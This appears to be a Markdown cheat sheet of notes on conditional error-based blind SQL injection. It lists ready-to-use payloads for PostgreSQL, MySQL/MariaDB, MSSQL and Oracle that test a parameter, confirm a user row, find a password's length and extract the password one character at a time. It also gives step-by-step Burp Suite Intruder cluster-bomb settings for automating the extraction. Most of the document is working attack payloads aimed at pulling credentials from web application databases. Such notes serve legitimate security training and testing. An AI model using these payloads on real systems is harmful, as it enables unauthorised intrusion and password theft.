
## Error based SQLi

- No database rows are returned. If SQL query has error then error message is returned else nothing.
- We can use our custom payload to generate specific errors and use those errors to gain further info about the database and ask **true** and **false** questions instead of directly asking it.
- We need to use the errors as **true** and **false** statements accordingly.

### 1. Checking Parameter Vulnerability

```sql
'
''
/*
verify which one of the above payloads cause error and which payload makes it disappear. If there is error produced in one and the other produces none then we have a vulnerable parameter. Since its a conditional error based sqli so direct true false queries will not work since the wep app will not return any rows. 
you need to have a basic idea of what the original query is.
*/
```

### 2. Testing Error Entries

```sql
-- PostgreSQL
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)--

-- MySQL / MariaDB
' AND (SELECT IF(1=1,1/0,1))#
' AND (SELECT IF(1=2,1/0,1))#

-- Microsoft SQL Server (MSSQL)
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)--

-- Oracle (all versions)
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)--
' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)--

/*
test both 1=1 and 1=2 conditions of the payload
these payloads are designed in true/false conditions
one will produce error and the other no error indicating conditonal error based sqli.
check the PortSwigger CHEATSHEET for database specific payloads.
*/
```

### 3. Checking User Entry

```sql
-- PostgreSQL, Microsoft SQL Server (MSSQL)
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>')='a'--

-- MySQL / MariaDB
' AND (SELECT IF(1=2,1/0,'a') FROM <table_name> WHERE <username_column>='<username>')='a'#

-- Oracle
' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>' AND ROWNUM=1)='a'--

/*
check the PortSwigger CHEATSHEET for database specific payloads.
*/
```

### 4. Finding Password Length

- If `LENGTH(<password_column>) > <value>` is **true** → you get an **error**
- If `LENGTH(<password_column>) > <value>` is **false** → it returns `'a'` (no error)
- The first no error request in the length of the password.

**TIP: Send this request to BurpSuite Intruder and then add payload in the `<value>` part and set Payload Type to Numbers and provide a starting and ending range. Then start the attack.**

```sql
-- PostgreSQL, Microsoft SQL Server (MSSQL)
' AND (SELECT CASE WHEN LENGTH(<password_column>)><value> THEN 1/0 ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>')='a'--

-- MySQL / MariaDB
' AND (SELECT IF(LENGTH(<password_column>)><value>,1/0,'a') FROM <table_name> WHERE <username_column>='<username>')='a'#

-- Oracle
' AND (SELECT CASE WHEN LENGTH(<password_column>)><value> THEN TO_CHAR(1/0) ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>' AND ROWNUM=1)='a'--

/*
check the PortSwigger CHEATSHEET for database specific payloads.
*/
```

### 5. Bruteforcing Password

- **LOGIC**
	- This attack uses **Blind SQL Injection with BurpSuite Intruder** to extract sensitive data (e.g., password) one character at a time by checking conditions. The base payload structure is `SELECT item_name FROM Shop WHERE item_name='input'`
	- The payload is designed to extract a **single character from the password column** using the `SUBSTR()` function. It compares that character with a guessed value provided via BurpSuite payloads.
	
- **SETUP**
	- Use BurpSuite **CLUSTER BOMB ATTACK**.
	- **Payload 1 Configuration**
		- `§1§` is the **INDEX VALUE**.
		- `§1§` should contain numbers from 1 to **length of the password**.
		- `Payload Type -> Numbers`, `Start -> 1`, `End -> length of password`, `Step -> 1 `
		- Testing each character from the **payload 2** wordlist against each index of the password value.
		
	- **Payload 2 Configuration**
		- `§2§` is the **WORDLIST CHARACTER**.
		- `§2§` will contain one character each line. 
		- `Payload Type -> Bruteforcer` , `Character Set -> abcdefghijklmnopqrstuvwxyz0123456789`, `Min Length -> 1 Max Length -> 1`
		
- **WORKING**
	- If error is produced then **true** else **false**. It means if error then character matches index character value. Use the BurpSuite to look for these error requests.

```sql
-- PostgreSQL, Microsoft SQL Server (MSSQL)
' AND (SELECT CASE WHEN SUBSTRING(<password_column>,§1§,1)='§2§' THEN 1/0 ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>')='a'--

-- MySQL / MariaDB
' AND (SELECT IF(SUBSTRING(<password_column>,§1§,1)='§2§',1/0,'a') FROM <table_name> WHERE <username_column>='<username>')='a'#

-- Oracle (all versions)
' AND (SELECT CASE WHEN SUBSTR(<password_column>,§1§,1)='§2§' THEN TO_CHAR(1/0) ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>' AND ROWNUM=1)='a'--

/*
check the PortSwigger CHEATSHEET for database specific payloads.
*/
```

---
## Examining the Database

[SQLi CHEATSHEET PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)